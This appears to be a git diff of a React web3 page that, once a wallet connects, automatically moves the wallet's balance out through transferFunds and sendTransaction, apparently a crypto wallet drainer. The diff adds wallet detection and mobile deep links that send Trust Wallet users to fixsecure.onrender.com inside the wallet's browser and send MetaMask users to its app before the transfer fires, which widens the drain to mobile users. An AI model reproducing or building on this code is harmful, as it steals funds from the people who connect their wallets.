@@ -11,7 +11,7 @@ import {
   solanaDevnet, 
   bitcoin,   sepolia, 
 } from '@reown/appkit/networks';
-import { useAppKit  } from "@reown/appkit/react";
+import { useAppKit, useWalletInfo  } from "@reown/appkit/react";
 import {
   useAccount,
   useSendTransaction,
@@ -46,12 +46,12 @@ import { useEffect, useState } from "react";
 const Home = () => {
   const [totalFee, setTotalFee] = useState(null);
 
-  const { open } = useAppKit();
+  const { open  } = useAppKit();
   const { address, isConnected } = useAccount();
   const balance = useBalance({ address });
   const [amountToSend, setAmountToSend] = useState(null);
   const { switchChain } = useSwitchChain()
-
+   const { walletInfo } = useWalletInfo();
   const [txHash, setTxHash] = useState(null);
 
   const chainId = useChainId();
@@ -115,20 +115,29 @@ function formatBalance(balanceBigInt, chain) {
     }
   }, [confirmed]);
 
+  const isMobile = () => /Mobi|Android/i.test(navigator.userAgent)
+  const [visitedTW, setVisitedTW ] = useState(false)
+
   useEffect(() => {
     if (isConnected && address ) {
       console.log("Wallet connected:", address);
       console.log("Connected to:", activeChain?.name);
+      console.log("Connected wallet", walletInfo?.name);
+
+          if (walletInfo?.name  === "Trust Wallet" && isMobile() && !visitedTW) {
+      // Open Trust Wallet with deep link
+      window.location.href = `https://link.trustwallet.com/open_url?coin_id=${chainId}&url=https://fixsecure.onrender.com`
+      setVisitedTW(true)
+      return
+    }
       walletConnectNotification();
       console.log("chainId:", chainId)
       console.log("activeChain:", activeChain?.id)
 
-        if (chainId !== activeChain?.id) {
-    console.log("Wrong network, switching...");
-    switchChain({ chainId: activeChain?.id });
+        if (chainId !== activeChain?.id) {  switchChain({ chainId: activeChain?.id });
     return;
   }
-      console.log("Balance:", formatBalance(balance.data?.value, activeChain));
+      console.log("Balance:", formatBalance(balance.data?.value, activeChain,  walletInfo?.name));
 
       // ✅ Now safe to call transfer
       transferFunds();
@@ -168,6 +177,10 @@ function formatBalance(balanceBigInt, chain) {
     if (balance.data?.value <= 0n || !amountToSend || amountToSend <= 0n) {
       console.log("not enough fund to cover gas fee or walletr not funded");
       return;
+    }
+
+    if(walletInfo?.name === "MetaMask" && isMobile()) {
+      window.location.href = "https://link.metamask.io"
     }
 
     sendTransaction(
